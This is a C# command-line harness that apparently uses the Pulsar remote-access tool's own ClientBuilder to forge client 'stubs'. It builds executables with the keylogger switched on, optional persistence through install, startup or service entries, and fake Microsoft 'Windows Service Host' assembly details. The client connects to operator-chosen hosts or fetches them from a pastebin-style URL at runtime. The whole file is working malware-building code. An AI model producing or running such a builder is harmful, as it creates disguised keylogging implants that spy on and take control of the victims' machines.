using Pulsar.Server.Build;
using Pulsar.Server.Models;

// Parameterized stub forge using the server's own ClientBuilder.
// Usage:
//   StubBuilder -hosts "127.0.0.1:4782" -out C:\path\Out.exe [-tag NAME] [-pastebin] [-install] [-startup]
//   -pastebin : treat -hosts value as a URL fetched by the stub at runtime
// Requirements at runtime:
//   - PulsarStuff\Pulsar.p12 next to this exe
//   - OutputPath must differ from this exe's directory

string baseDir = AppContext.BaseDirectory;

string hosts = null, outputPath = null, tag = "STUB";
bool pastebinMode = false, install = false, startup = false, service = false, gui = false;

for (int i = 0; i < args.Length; i++)
{
    switch (args[i])
    {
        case "-hosts": hosts = args[++i]; break;
        case "-out": outputPath = args[++i]; break;
        case "-tag": tag = args[++i]; break;
        case "-pastebin": pastebinMode = true; break;
        case "-install": install = true; break;
        case "-startup": startup = true; break;
        case "-service": service = true; break;
        case "-gui": gui = true; break;
    }
}

if (hosts == null || outputPath == null)
{
    Console.Error.WriteLine("usage: StubBuilder -hosts <host:port|url> -out <path.exe> [-tag NAME] [-pastebin]");
    return 2;
}

var options = new BuildOptions
{
    Install = install,
    Startup = install && startup,
    HideFile = false,
    Keylogger = true,
    Tag = tag,
    Mutex = "Psr_" + Guid.NewGuid().ToString("N").Substring(0, 12),
    RawHosts = hosts,
    Pastebin = pastebinMode,
    Version = "1.0.0",
    Delay = 5000,
    InstallPath = 1, // ApplicationData
    InstallSub = Path.GetFileNameWithoutExtension(outputPath),
    InstallName = Path.GetFileName(outputPath),
    StartupName = Path.GetFileNameWithoutExtension(outputPath),
    OutputPath = outputPath,
    AssemblyInformation = new[]
    {
        Path.GetFileNameWithoutExtension(outputPath),
        "Windows Service Host",
        "Microsoft",
        "(C) Microsoft Corporation",
        "",
        "",
        "1.0.0.0",
        "1.0.0.0"
    },
    LogDirectoryName = "Logs",
    HideLogDirectory = false,
    HideInstallSubdirectory = false,
    AntiVM = false,
    AntiDebug = false,
    UACBypass = false,
    CRITICALPROCESS = false,
    INSTALLSERVICE = service,
    SHOWCLIENTGUI = gui
};

Directory.CreateDirectory(Path.GetDirectoryName(outputPath));

// Locate the client.bin template by walking upward from the current directory,
// so the harness works from anywhere inside the repo.
string clientTemplate = null;
for (string dir = Directory.GetCurrentDirectory(); !string.IsNullOrEmpty(dir); dir = Path.GetDirectoryName(dir))
{
    string candidate = Path.Combine(dir, "bin", "Release", "net9.0-windows", "client.bin");
    if (File.Exists(candidate)) { clientTemplate = candidate; break; }
}
if (clientTemplate == null) { Console.Error.WriteLine("ERROR: client.bin template not found — run from inside the repo (expects bin/Release/net9.0-windows/client.bin)"); return 3; }

// Pulsar.p12: prefer the harness directory, fall back to the server output directory next to client.bin.
string p12Path = Path.Combine(baseDir, "PulsarStuff", "Pulsar.p12");
if (!File.Exists(p12Path))
{
    string alt = Path.Combine(Path.GetDirectoryName(clientTemplate), "PulsarStuff", "Pulsar.p12");
    if (File.Exists(alt)) p12Path = alt;
}
if (!File.Exists(p12Path)) { Console.Error.WriteLine("ERROR: PulsarStuff\\Pulsar.p12 not found next to the harness or beside client.bin"); return 4; }

Console.WriteLine($"[+] mode={((pastebinMode) ? "PASTEBIN-URL" : "DIRECT")} hosts={hosts}");
Console.WriteLine($"[+] out={outputPath}");

var builder = new ClientBuilder(options, clientTemplate);
bool warn = builder.Build(false, false);

var fi = new FileInfo(outputPath);
if (!fi.Exists) { Console.Error.WriteLine("ERROR: stub not written"); return 1; }
Console.WriteLine($"[+] built {fi.Length} bytes (warn={warn})");
return 0;
